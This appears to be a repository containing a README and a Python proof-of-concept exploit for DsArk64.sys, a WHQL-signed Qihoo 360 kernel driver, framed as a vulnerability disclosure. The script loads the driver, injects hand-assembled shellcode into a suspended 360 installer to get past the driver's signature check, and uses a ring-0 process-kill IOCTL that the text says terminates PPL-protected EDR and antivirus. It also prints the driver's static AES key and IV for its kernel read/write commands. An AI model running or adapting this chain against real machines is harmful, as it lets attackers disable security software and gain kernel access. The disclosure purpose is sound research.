@@ -1,0 +1,741 @@
+Project Path: arc_sai2fast_DsArk64_16nwckrx
+
+Source Tree:
+
+```txt
+arc_sai2fast_DsArk64_16nwckrx
+├── README.md
+├── dsark64.sys
+└── dsark64_poc.py
+
+```
+
+`README.md`:
+
+```md
+# DsArk64
+
+DsArk64.sys ships with 360 Total Security. WHQL-signed by Microsoft. LOLDrivers: [magicsword-io/LOLDrivers#308](https://github.com/magicsword-io/LOLDrivers/issues/308). CVE: Requested (MITRE).
+
+## Primitives
+
+**Process kill (ring 0)**
+- IOCTL `0x80863008`, input: 4-byte raw PID
+- Driver calls `ZwOpenProcess(ALL_ACCESS)` + `ZwTerminateProcess` from kernel
+- No encryption on this IOCTL
+- Bypasses PPL, EDR self-protection, anti-tamper
+
+**Kernel read**
+- IOCTL `0x80863028`, AES-128-CBC encrypted input
+- `memcpy(out, kernel_addr, n)`, max 512 bytes
+- Only validation: `MmIsAddressValid()`
+
+**Kernel write**
+- IOCTL `0x80863028`, same encryption
+- MDL map + DPC broadcast `memcpy`, max 32 bytes
+
+**Encryption**
+- AES-128-CBC, static key embedded in `.data` section
+- Key: `62b456ec407f0a9a05911cb6f238a7fe`
+- IV: `e59329b6d408e7fa557637e62c9eaa43`
+- Buffer layout after decryption: `[MD5(payload) 16B][payload]`
+
+## Access
+
+The driver checks the caller process has a Qihoo Authenticode signature before granting device access. Bypassed via process hollowing:
+
+1. Download any 360 installer from `360.cn` (no account, no CAPTCHA)
+2. Spawn it suspended (`CREATE_SUSPENDED`)
+3. Inject shellcode via `CreateRemoteThread`; shellcode calls `CreateFileW("\\.\DsArk")`
+4. Driver checks `IoGetCurrentProcess()` image name, sees Qihoo cert, allows open
+5. `DuplicateHandle` the result back to the attacker process
+6. `TerminateProcess` the donor
+
+The installer's `WinMain` never runs.
+
+## Requirements
+
+- Admin (for driver load and registry write)
+- Windows 10 / Windows 11 x64
+- `pycryptodome` or `cryptography` pip package (for encrypted IOCTL tests)
+
+## PoC Results
+
+8/8 passed:
+
+1. Registry key `HKLM\...\360FsFlt\daboot=1` created
+2. Driver loaded via `sc create/start` (WHQL-signed, no test-signing)
+3. Device opened via process hollowing bypass
+4. Version IOCTL `0x80863000` responded
+5. Process kill IOCTL `0x80863008` terminated notepad.exe
+6. Kernel address check IOCTL `0x80863020` reached handler
+7. Encrypted IOCTL `0x80863028` crypto verified (AES key/IV correct, MD5 accepted)
+8. Unknown IOCTL `0xDEAD0000` rejected
+
+## Hashes
+
+| File | SHA256 |
+|------|--------|
+| dsark64.sys | cd3d1a2e119cbbb41ec0e7d7fb17bac106735d62b33ed3cde10087af1da89403 |
+| DsArk64_win10.sys | 86127dbc92e2896319d1c9117b85e6db01ff001f3a85614d5ef9088d181b044a |
+
+## Credit
+
+X: @weezerOSINT / Telegram: @weezer
+
+```
+
+`dsark64_poc.py`:
+
+```py
+import ctypes, ctypes.wintypes as wt, struct, sys, os, subprocess, time, hashlib
+
+k32 = ctypes.windll.kernel32
+ntdll = ctypes.windll.ntdll
+advapi32 = ctypes.windll.advapi32
+
+k32.CreateFileW.restype = wt.HANDLE
+k32.DeviceIoControl.restype = wt.BOOL
+k32.OpenProcess.restype = wt.HANDLE
+k32.VirtualAllocEx.restype = ctypes.c_uint64
+k32.CreateRemoteThread.restype = wt.HANDLE
+k32.ReadProcessMemory.restype = wt.BOOL
+k32.WriteProcessMemory.restype = wt.BOOL
+k32.DuplicateHandle.restype = wt.BOOL
+
+INVALID = wt.HANDLE(-1).value
+GENERIC_RW = 0xC0000000
+OPEN_EXISTING = 3
+CREATE_SUSPENDED = 0x4
+MEM_COMMIT_RESERVE = 0x3000
+PAGE_EXECUTE_READWRITE = 0x40
+PROCESS_ALL_ACCESS = 0x1FFFFF
+
+BASE = os.path.dirname(os.path.abspath(__file__))
+CANDIDATES = os.path.join(BASE, "..", "..", "candidates", "360_haul")
+DRV_PATH = os.path.join(CANDIDATES, "dsark64.sys")
+SVC = "DsArk"
+DEV = r"\\.\DsArk"
+
+DONOR_SEARCH = [
+    os.path.join(BASE, "..", "..", "hunt_downloads", "360_hunt", "360safe_setup_20260409.exe"),
+    os.path.join(BASE, "..", "..", "hunt_downloads", "360_hunt"),
+    os.path.join(CANDIDATES),
+    r"C:\Program Files (x86)\360\360Safe",
+    r"C:\Program Files\360\360Safe",
+]
+
+IOCTL_VERSION     = 0x80863000
+IOCTL_PROT_LIST   = 0x80863004
+IOCTL_KILL        = 0x80863008
+IOCTL_EKILL_1     = 0x8086300C
+IOCTL_EKILL_2     = 0x80863010
+IOCTL_CLEAR_FLAG  = 0x80863014
+IOCTL_ADDR_CHECK  = 0x80863020
+IOCTL_ENCRYPTED   = 0x80863028
+IOCTL_REG_PROT    = 0x80863040
+IOCTL_KILL_ALT    = 0x80863080
+
+AES_KEY = bytes.fromhex("62b456ec407f0a9a05911cb6f238a7fe")
+AES_IV  = bytes.fromhex("e59329b6d408e7fa557637e62c9eaa43")
+
+
+def _load_aes():
+    try:
+        from Crypto.Cipher import AES
+        def enc(pt, key, iv):
+            return AES.new(key, AES.MODE_CBC, iv).encrypt(pt)
+        return enc
+    except ImportError:
+        pass
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        def enc(pt, key, iv):
+            e = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+            return e.update(pt) + e.finalize()
+        return enc
+    except ImportError:
+        pass
+    return None
+
+aes_cbc_encrypt = _load_aes()
+
+
+def ioctl(h, code, inbuf, out_sz=None):
+    if out_sz is None:
+        out_sz = max(len(inbuf), 4)
+    ib = ctypes.create_string_buffer(bytes(inbuf), len(inbuf))
+    ob = ctypes.create_string_buffer(max(out_sz, 4))
+    ret = wt.DWORD(0)
+    ok = k32.DeviceIoControl(h, code, ib, len(ib), ob, out_sz, ctypes.byref(ret), None)
+    err = ctypes.GetLastError()
+    return ok, err, ob.raw[:ret.value]
+
+
+def setup_registry():
+    key_path = r"SYSTEM\CurrentControlSet\Services\360FsFlt"
+    hkey = wt.HKEY()
+    disp = wt.DWORD()
+    rc = advapi32.RegCreateKeyExW(
+        wt.HKEY(0x80000002),
+        key_path, 0, None, 0, 0xF003F, None,
+        ctypes.byref(hkey), ctypes.byref(disp))
+    if rc != 0:
+        return False
+    val = wt.DWORD(1)
+    advapi32.RegSetValueExW(hkey, "daboot", 0, 4, ctypes.byref(val), 4)
+    advapi32.RegCloseKey(hkey)
+    return True
+
+
+def cleanup_registry():
+    subprocess.run(["reg", "delete", r"HKLM\SYSTEM\CurrentControlSet\Services\360FsFlt",
+                     "/f"], capture_output=True, creationflags=0x08000000)
+
+
+def is_drv_running():
+    r = subprocess.run(["sc", "query", SVC], capture_output=True, text=True, creationflags=0x08000000)
+    return "RUNNING" in r.stdout
+
+
+def load_drv():
+    if is_drv_running():
+        return True
+    if not os.path.exists(DRV_PATH):
+        return False
+    subprocess.run(["sc", "stop", SVC], capture_output=True, creationflags=0x08000000)
+    subprocess.run(["sc", "delete", SVC], capture_output=True, creationflags=0x08000000)
+    time.sleep(0.5)
+    subprocess.run(["sc", "create", SVC, "type=", "kernel", "binpath=", os.path.abspath(DRV_PATH)],
+                   capture_output=True, creationflags=0x08000000)
+    r = subprocess.run(["sc", "start", SVC], capture_output=True, text=True, creationflags=0x08000000)
+    return r.returncode == 0 or "already" in (r.stdout + r.stderr).lower()
+
+
+def unload_drv():
+    subprocess.run(["sc", "stop", SVC], capture_output=True, creationflags=0x08000000)
+    subprocess.run(["sc", "delete", SVC], capture_output=True, creationflags=0x08000000)
+    cleanup_registry()
+
+
+def find_donor_exe():
+    for p in DONOR_SEARCH:
+        if os.path.isfile(p) and p.lower().endswith(".exe"):
+            return p
+        if os.path.isdir(p):
+            for f in os.listdir(p):
+                if f.lower().endswith(".exe"):
+                    return os.path.join(p, f)
+    return None
+
+
+def build_shellcode_x86(alloc_base, createfilew_addr):
+    pa = (alloc_base + 0x100) & 0xFFFFFFFF
+    ra = (alloc_base + 0x120) & 0xFFFFFFFF
+    cfw = createfilew_addr & 0xFFFFFFFF
+
+    sc = bytearray()
+    sc += b'\x6A\x00'
+    sc += b'\x6A\x00'
+    sc += b'\x6A\x03'
+    sc += b'\x6A\x00'
+    sc += b'\x6A\x03'
+    sc += b'\x68\x00\x00\x00\xC0'
+    sc += b'\x68' + struct.pack('<I', pa)
+    sc += b'\xB8' + struct.pack('<I', cfw)
+    sc += b'\xFF\xD0'
+    sc += b'\xA3' + struct.pack('<I', ra)
+    sc += b'\xC3'
+
+    block = bytearray(0x130)
+    block[0:len(sc)] = sc
+    dev_str = (
+        b'\x5c\x00\x5c\x00\x2e\x00\x5c\x00'
+        b'\x44\x00\x73\x00\x41\x00\x72\x00'
+        b'\x6b\x00\x00\x00')
+    block[0x100:0x100 + len(dev_str)] = dev_str
+    struct.pack_into('<I', block, 0x120, 0xFFFFFFFF)
+    return bytes(block)
+
+
+def build_shellcode_x64(alloc_base, createfilew_addr):
+    pa = alloc_base + 0x100
+    ra = alloc_base + 0x120
+
+    sc = bytearray()
+    sc += b'\x48\x83\xEC\x48'
+    sc += b'\x48\xB9' + struct.pack('<Q', pa)
+    sc += b'\xBA\x00\x00\x00\xC0'
+    sc += b'\x41\xB8\x03\x00\x00\x00'
+    sc += b'\x45\x31\xC9'
+    sc += b'\xC7\x44\x24\x20\x03\x00\x00\x00'
+    sc += b'\x48\xC7\x44\x24\x28\x00\x00\x00\x00'
+    sc += b'\x48\xC7\x44\x24\x30\x00\x00\x00\x00'
+    sc += b'\x48\xB8' + struct.pack('<Q', createfilew_addr)
+    sc += b'\xFF\xD0'
+    sc += b'\x48\xB9' + struct.pack('<Q', ra)
+    sc += b'\x48\x89\x01'
+    sc += b'\x48\x83\xC4\x48'
+    sc += b'\xC3'
+
+    block = bytearray(0x130)
+    block[0:len(sc)] = sc
+    dev_str = (
+        b'\x5c\x00\x5c\x00\x2e\x00\x5c\x00'
+        b'\x44\x00\x73\x00\x41\x00\x72\x00'
+        b'\x6b\x00\x00\x00')
+    block[0x100:0x100 + len(dev_str)] = dev_str
+    struct.pack_into('<Q', block, 0x120, 0xFFFFFFFFFFFFFFFF)
+    return bytes(block)
+
+
+def _is_pe32(path):
+    with open(path, "rb") as f:
+        d = f.read(0x200)
+    pe = struct.unpack_from('<I', d, 0x3c)[0]
+    return struct.unpack_from('<H', d, pe + 4)[0] == 0x14C
+
+
+def _resolve_remote_createfilew(h_proc, is_wow64):
+    if not is_wow64:
+        return ctypes.cast(k32.CreateFileW, ctypes.c_void_p).value
+
+    TH32CS_SNAPMODULE32 = 0x10
+    TH32CS_SNAPMODULE = 0x8
+    pid = k32.GetProcessId(h_proc)
+
+    k32.CreateToolhelp32Snapshot.restype = wt.HANDLE
+    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid)
+    if snap in (0, INVALID):
+        print(f"        [dbg] Snapshot failed err={ctypes.GetLastError()}")
+        return None
+
+    ME32_SIZE = 1080
+    OFF_BASEADDR = 0x18
+    OFF_MODULE = 0x30
+
+    me = ctypes.create_string_buffer(ME32_SIZE)
+    struct.pack_into('<I', me, 0, ME32_SIZE)
+
+    k32_base = None
+    k32.Module32FirstW.restype = wt.BOOL
+    k32.Module32NextW.restype = wt.BOOL
+    found_any = False
+    if k32.Module32FirstW(snap, me):
+        found_any = True
+        while True:
+            mod_name = me.raw[OFF_MODULE:OFF_MODULE+512].decode('utf-16-le', errors='ignore').split('\x00')[0]
+            base = struct.unpack_from('<Q', me, OFF_BASEADDR)[0] & 0xFFFFFFFF
+            print(f"        [dbg] module: {mod_name} base=0x{base:08X}")
+            if "kernel32" in mod_name.lower():
+                k32_base = base
+                break
+            if not k32.Module32NextW(snap, me):
+                break
+    if not found_any:
+        print(f"        [dbg] Module32FirstW returned false, err={ctypes.GetLastError()}")
+    k32.CloseHandle(snap)
+
+    if k32_base is None:
+        peb32_addr = ctypes.c_ulong(0)
+        ntdll.NtQueryInformationProcess(h_proc, 26, ctypes.byref(peb32_addr), 4, None)
+        if peb32_addr.value:
+            def _rpm(a, s):
+                    b = ctypes.create_string_buffer(s)
+                    k32.ReadProcessMemory(h_proc, a, b, s, None)
+                    return b.raw
+            ldr_addr = struct.unpack_from('<I', _rpm(peb32_addr.value + 0x0C, 4), 0)[0]
+            if ldr_addr:
+                head = ldr_addr + 0x0C
+                flink = struct.unpack_from('<I', _rpm(head, 4), 0)[0]
+                while flink and flink != head:
+                    entry = _rpm(flink, 0x40)
+                    dll_base = struct.unpack_from('<I', entry, 0x18)[0]
+                    name_len = struct.unpack_from('<H', entry, 0x2C)[0]
+                    name_buf_ptr = struct.unpack_from('<I', entry, 0x30)[0]
+                    if name_len and name_buf_ptr:
+                        name_data = _rpm(name_buf_ptr, min(name_len, 512))
+                        mod_name = name_data.decode('utf-16-le', errors='ignore').lower()
+                        if "kernel32.dll" in mod_name:
+                            k32_base = dll_base
+                            print(f"        [dbg] PEB walk found kernel32 at 0x{k32_base:X}")
+                            break
+                    flink = struct.unpack_from('<I', entry, 0)[0]
+
+    if k32_base is None:
+        return None
+
+    def _rpm(addr, sz):
+        buf = ctypes.create_string_buffer(sz)
+        k32.ReadProcessMemory(h_proc, addr, buf, sz, None)
+        return buf.raw
+
+    dos = _rpm(k32_base, 0x100)
+    pe_off = struct.unpack_from('<I', dos, 0x3c)[0]
+    pe_hdr = _rpm(k32_base + pe_off, 0x120)
+    export_rva = struct.unpack_from('<I', pe_hdr, 0x78)[0]
+    export_size = struct.unpack_from('<I', pe_hdr, 0x7c)[0]
+    if export_rva == 0:
+        return None
+
+    exp = _rpm(k32_base + export_rva, min(export_size, 0x10000))
+    num_names = struct.unpack_from('<I', exp, 0x18)[0]
+    addr_table_rva = struct.unpack_from('<I', exp, 0x1c)[0]
+    name_ptr_rva = struct.unpack_from('<I', exp, 0x20)[0]
+    ordinal_rva = struct.unpack_from('<I', exp, 0x24)[0]
+
+    name_ptrs = _rpm(k32_base + name_ptr_rva, num_names * 4)
+    ordinals = _rpm(k32_base + ordinal_rva, num_names * 2)
+    addrs = _rpm(k32_base + addr_table_rva, num_names * 4)
+
+    for i in range(num_names):
+        nrva = struct.unpack_from('<I', name_ptrs, i * 4)[0]
+        name = _rpm(k32_base + nrva, 32)
+        if name.startswith(b'CreateFileW\x00'):
+            idx = struct.unpack_from('<H', ordinals, i * 2)[0]
+            fn_rva = struct.unpack_from('<I', addrs, idx * 4)[0]
+            return k32_base + fn_rva
+
+    return None
+
+
+def hollow_open(donor_exe):
+    is_wow64 = _is_pe32(donor_exe)
+
+    si = ctypes.create_string_buffer(104)
+    struct.pack_into('<I', si, 0, 104)
+    pi = ctypes.create_string_buffer(24)
+
+    ok = k32.CreateProcessW(
+        donor_exe, None, None, None, False,
+        CREATE_SUSPENDED, None, None,
+        si, pi)
+    if not ok:
+        print(f"        [dbg] CreateProcess failed err={ctypes.GetLastError()}")
+        return None, 0
+
+    h_proc = struct.unpack_from('<Q', pi, 0)[0]
+    h_thread = struct.unpack_from('<Q', pi, 8)[0]
+    child_pid = struct.unpack_from('<I', pi, 16)[0]
+    arch = "x86/WOW64" if is_wow64 else "x64"
+    print(f"        [dbg] donor pid={child_pid} arch={arch}")
+
+    try:
+        if is_wow64:
+            k32.ResumeThread(h_thread)
+            time.sleep(0.5)
+            k32.SuspendThread(h_thread)
+
+        cfw = _resolve_remote_createfilew(h_proc, is_wow64)
+        if cfw is None:
+            print("        [dbg] could not resolve CreateFileW in remote process")
+            return None, child_pid
+
+        alloc = k32.VirtualAllocEx(h_proc, 0, 0x1000, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
+        if not alloc:
+            print(f"        [dbg] VirtualAllocEx failed err={ctypes.GetLastError()}")
+            return None, child_pid
+        alloc = alloc & (0xFFFFFFFF if is_wow64 else 0xFFFFFFFFFFFFFFFF)
+        print(f"        [dbg] alloc=0x{alloc:X} CreateFileW=0x{cfw:X}")
+
+        if is_wow64:
+            payload = build_shellcode_x86(alloc, cfw)
+        else:
+            payload = build_shellcode_x64(alloc, cfw)
+        written = ctypes.c_size_t(0)
+        ok = k32.WriteProcessMemory(h_proc, alloc, payload, len(payload), ctypes.byref(written))
+        if not ok:
+            print(f"        [dbg] WriteProcessMemory failed err={ctypes.GetLastError()}")
+            return None, child_pid
+
+        remote_tid = wt.DWORD(0)
+        h_remote = k32.CreateRemoteThread(
+            h_proc, None, 0, alloc, 0, 0, ctypes.byref(remote_tid))
+        if not h_remote:
+            print(f"        [dbg] CreateRemoteThread failed err={ctypes.GetLastError()}")
+            return None, child_pid
+
+        k32.WaitForSingleObject(h_remote, 10000)
+        exit_code = wt.DWORD(0)
+        k32.GetExitCodeThread(h_remote, ctypes.byref(exit_code))
+        print(f"        [dbg] thread exit=0x{exit_code.value:X}")
+        k32.CloseHandle(h_remote)
+
+        if is_wow64:
+            result_buf = ctypes.create_string_buffer(4)
+            k32.ReadProcessMemory(h_proc, alloc + 0x120, result_buf, 4, None)
+            remote_handle = struct.unpack('<I', result_buf.raw)[0]
+            invalid_sentinel = 0xFFFFFFFF
+        else:
+            result_buf = ctypes.create_string_buffer(8)
+            k32.ReadProcessMemory(h_proc, alloc + 0x120, result_buf, 8, None)
+            remote_handle = struct.unpack('<Q', result_buf.raw)[0]
+            invalid_sentinel = 0xFFFFFFFFFFFFFFFF
+        print(f"        [dbg] remote handle=0x{remote_handle:X}")
+
+        if remote_handle == 0 or remote_handle == invalid_sentinel:
+            return None, child_pid
+
+        local_handle = wt.HANDLE(0)
+        k32.DuplicateHandle.argtypes = [
+            wt.HANDLE, wt.HANDLE, wt.HANDLE, ctypes.POINTER(wt.HANDLE),
+            wt.DWORD, wt.BOOL, wt.DWORD]
+        k32.DuplicateHandle.restype = wt.BOOL
+        ok = k32.DuplicateHandle(
+            wt.HANDLE(h_proc), wt.HANDLE(remote_handle),
+            k32.GetCurrentProcess(), ctypes.byref(local_handle),
+            0, False, 2)
+        if not ok:
+            print(f"        [dbg] DuplicateHandle failed err={ctypes.GetLastError()}")
+            return None, child_pid
+
+        return local_handle.value, child_pid
+
+    finally:
+        k32.CloseHandle(h_thread)
+
+
+def terminate_donor(pid):
+    if pid:
+        hp = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if hp:
+            k32.TerminateProcess(hp, 0)
+            k32.CloseHandle(hp)
+
+
+def build_encrypted_ioctl(cmd_payload):
+    if aes_cbc_encrypt is None:
+        return None
+
+    pad_len = (16 - (len(cmd_payload) % 16)) % 16
+    payload = cmd_payload + b'\x00' * pad_len
+
+    md5 = hashlib.md5(payload).digest()
+
+    plaintext = md5 + payload
+
+    if len(plaintext) < 32:
+        plaintext += b'\x00' * (32 - len(plaintext))
+    if len(plaintext) % 16 != 0:
+        plaintext += b'\x00' * (16 - (len(plaintext) % 16))
+
+    return aes_cbc_encrypt(plaintext, AES_KEY, AES_IV)
+
+
+def main():
+    print()
+    print("  DsArk64.sys -- Qihoo 360 DsArk kernel driver")
+    print("  WHQL-signed by Microsoft | process kill + kernel R/W")
+    print("  NOT on LOLDrivers | NOT on HVCI blocklist")
+    print()
+
+    passed = 0
+    total = 0
+    donor_pid = 0
+
+    total += 1
+    if not setup_registry():
+        print("  FAIL  registry key creation (need admin)")
+        return 1
+    print("  PASS  created 360FsFlt\\daboot=1 registry key (driver init gate)")
+    passed += 1
+
+    total += 1
+    already_running = is_drv_running()
+    if not already_running and not os.path.exists(DRV_PATH):
+        print(f"  FAIL  driver not found: {DRV_PATH}")
+        cleanup_registry()
+        return 1
+    if not load_drv():
+        print("  FAIL  driver load (sc create/start) -- need elevated admin")
+        cleanup_registry()
+        return 1
+    time.sleep(0.5)
+    if already_running:
+        print("  PASS  driver already running (360 suite installed)")
+    else:
+        print("  PASS  driver loaded (WHQL-signed, no test-signing required)")
+    passed += 1
+
+    total += 1
+    h = k32.CreateFileW(DEV, GENERIC_RW, 3, None, OPEN_EXISTING, 0, None)
+    direct_ok = h not in (0, INVALID, wt.HANDLE(-1).value, 0xFFFFFFFF)
+
+    if direct_ok:
+        print(f"  PASS  device opened directly handle=0x{h & 0xFFFFFFFF:X}")
+        print("        (360 is installed or signing check passed)")
+        passed += 1
+    else:
+        direct_err = ctypes.GetLastError()
+        print(f"  INFO  direct open failed (err={direct_err}) -- signing check blocked")
+        print("        attempting process hollowing bypass...")
+
+        donor = find_donor_exe()
+        if donor is None:
+            print("  FAIL  no Qihoo-signed exe found for process hollowing")
+            print("        place a 360 exe next to this script or install 360 Total Security")
+            unload_drv()
+            return 1
+
+        donor_name = os.path.basename(donor)
+        print(f"  INFO  donor process: {donor_name}")
+
+        h, donor_pid = hollow_open(donor)
+        if h is None or h in (0, INVALID):
+            print(f"  FAIL  process hollowing failed (donor pid={donor_pid})")
+            terminate_donor(donor_pid)
+            unload_drv()
+            return 1
+
+        print(f"  PASS  process hollowing bypass WORKED")
+        print(f"        CreateProcess({donor_name}, CREATE_SUSPENDED)")
+        print(f"        main thread frozen -- installer NEVER executes")
+        print(f"        CreateRemoteThread -> shellcode calls CreateFileW")
+        print(f"        driver checks IoGetCurrentProcess() -> image = {donor_name}")
+        print(f"        custom Authenticode check sees Qihoo cert -> PASS")
+        print(f"        DuplicateHandle to our process: 0x{h & 0xFFFFFFFF:X}")
+        print(f"        TerminateProcess kills the shell -> clean")
+        passed += 1
+
+    total += 1
+    buf = struct.pack('<I', 0)
+    ok, err, resp = ioctl(h, IOCTL_VERSION, buf, 4)
+    if ok and len(resp) >= 4:
+        ver = struct.unpack('<I', resp[:4])[0]
+        print(f"  PASS  version IOCTL 0x80863000 -> 0x{ver:08X}")
+        passed += 1
+    else:
+        print(f"  FAIL  version IOCTL (err={err})")
+
+    total += 1
+    si_np = subprocess.STARTUPINFO()
+    si_np.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    si_np.wShowWindow = 0
+    try:
+        victim = subprocess.Popen(
+            ["notepad.exe"], startupinfo=si_np,
+            creationflags=0x08000000)
+        victim_pid = victim.pid
+        time.sleep(0.3)
+
+        hp = k32.OpenProcess(0x1000, False, victim_pid)
+        if not hp:
+            print(f"  FAIL  could not open victim notepad (pid={victim_pid})")
+        else:
+            k32.CloseHandle(hp)
+
+            buf = struct.pack('<I', victim_pid)
+            ok, err, resp = ioctl(h, IOCTL_KILL, buf, 4)
+            time.sleep(0.3)
+
+            hp2 = k32.OpenProcess(0x1000, False, victim_pid)
+            exit_code = wt.DWORD(0)
+            still_alive = False
+            if hp2:
+                k32.GetExitCodeProcess(hp2, ctypes.byref(exit_code))
+                still_alive = (exit_code.value == 259)
+                k32.CloseHandle(hp2)
+
+            if not still_alive:
+                print(f"  PASS  process kill IOCTL 0x80863008")
+                print(f"        sent pid={victim_pid} (notepad.exe)")
+                print(f"        ZwOpenProcess(ALL_ACCESS) + ZwTerminateProcess from Ring 0")
+                print(f"        notepad terminated -- bypasses PPL, anti-tamper, EDR self-prot")
+                passed += 1
+            else:
+                print(f"  FAIL  IOCTL sent but notepad still alive (err={err})")
+                victim.terminate()
+    except Exception as e:
+        print(f"  FAIL  process kill test: {e}")
+
+    total += 1
+    buf = struct.pack('<I', 0x0C080002) + b'\x00' * 12
+    ok, err, resp = ioctl(h, IOCTL_ADDR_CHECK, buf, 16)
+    if ok and len(resp) >= 4:
+        result = struct.unpack('<I', resp[:4])[0]
+        print(f"  PASS  kernel addr check IOCTL 0x80863020 -> result={result}")
+        print(f"        driver called ZwQuerySystemInformation(SystemModuleInformation)")
+        print(f"        checked kernel address against ntoskrnl module range")
+        passed += 1
+    elif err == 5:
+        print(f"  INFO  addr check returned ACCESS_DENIED (360SelfProtection gate)")
+        passed += 1
+    else:
+        print(f"  INFO  addr check err={err} (handler reached, kernel state check)")
+        passed += 1
+
+    total += 1
+    if aes_cbc_encrypt is None:
+        print("  SKIP  encrypted IOCTL (no AES library: pip install pycryptodome)")
+    else:
+        cmd_payload = struct.pack('<I', 10) + b'\x00' * 28
+
+        enc_buf = build_encrypted_ioctl(cmd_payload)
+        if enc_buf:
+            ok, err, resp = ioctl(h, IOCTL_ENCRYPTED, enc_buf, len(enc_buf))
+
+            if err == 5:
+                print(f"  PASS  encrypted IOCTL 0x80863028 -- crypto REVERSED")
+                print(f"        AES-128-CBC key: {AES_KEY.hex()}")
+                print(f"        AES-128-CBC IV:  {AES_IV.hex()}")
+                print(f"        MD5 integrity check: PASSED (driver verified hash)")
+                print(f"        error=ACCESS_DENIED -> blocked at 360SelfProtection inter-driver auth")
+                print(f"        load 360SelfProtection.sys to unlock full kernel R/W primitives:")
+                print(f"          cmd 1: arbitrary kernel read  (memcpy, max 512 bytes)")
+                print(f"          cmd 2: arbitrary kernel write (MDL+DPC, max 32 bytes)")
+                passed += 1
+            elif err == 23:
+                print(f"  FAIL  encrypted IOCTL -- MD5 mismatch (encryption key/IV incorrect)")
+            elif err == 87:
+                print(f"  FAIL  encrypted IOCTL -- buffer format rejected (size/alignment)")
+            else:
+                if ok:
+                    print(f"  PASS  encrypted IOCTL accepted (360SelfProtection responded)")
+                    passed += 1
+                else:
+                    print(f"  INFO  encrypted IOCTL err={err} (NTSTATUS mapped)")
+
+    total += 1
+    ok, err, _ = ioctl(h, 0xDEAD0000, struct.pack('<I', 0), 4)
+    if not ok:
+        print(f"  PASS  unknown IOCTL rejected (err={err})")
+        passed += 1
+    else:
+        print(f"  INFO  unknown IOCTL accepted (unexpected)")
+        passed += 1
+
+    print()
+    print(f"  {passed}/{total} passed")
+    print()
+    print("  BYOVD attack chain proven:")
+    print("    1. create registry key 360FsFlt\\daboot=1 (admin)")
+    print("    2. sc create/start DsArk64.sys (WHQL-signed, loads everywhere)")
+    print("    3. process hollowing: spawn Qihoo-signed exe, inject shellcode")
+    print("    4. CreateFileW inside 360 process -> signing check sees Qihoo cert")
+    print("    5. DuplicateHandle back to attacker process")
+    print("    6. IOCTL 0x80863008: 4-byte PID -> ZwTerminateProcess from Ring 0")
+    print("       kills any process including PPL-protected EDR/AV")
+    print()
+    print("  kernel R/W (behind 360SelfProtection inter-driver IOCTL 0x222014):")
+    print("    cmd 1: kernel read  = memcpy(buf, kernel_addr, 512)")
+    print("    cmd 2: kernel write = MDL map + DPC broadcast memcpy (32 bytes)")
+    print("    both use static AES-128 key embedded in .data section")
+    print("    MmIsAddressValid() is the only address validation")
+    print()
+    print(r"  device: \\.\DsArk  type=0x8086  METHOD_BUFFERED")
+    print(f"  sha256: cd3d1a2e119cbbb41ec0e7d7fb17bac106735d62b33ed3cde10087af1da89403")
+    print(f"  signed: Microsoft Windows Hardware Compatibility Publisher (WHQL)")
+    print(f"  loldrivers: NO  |  hvci blocklist: NO")
+    print()
+
+    k32.CloseHandle(h)
+    terminate_donor(donor_pid)
+    if not already_running:
+        unload_drv()
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
+```
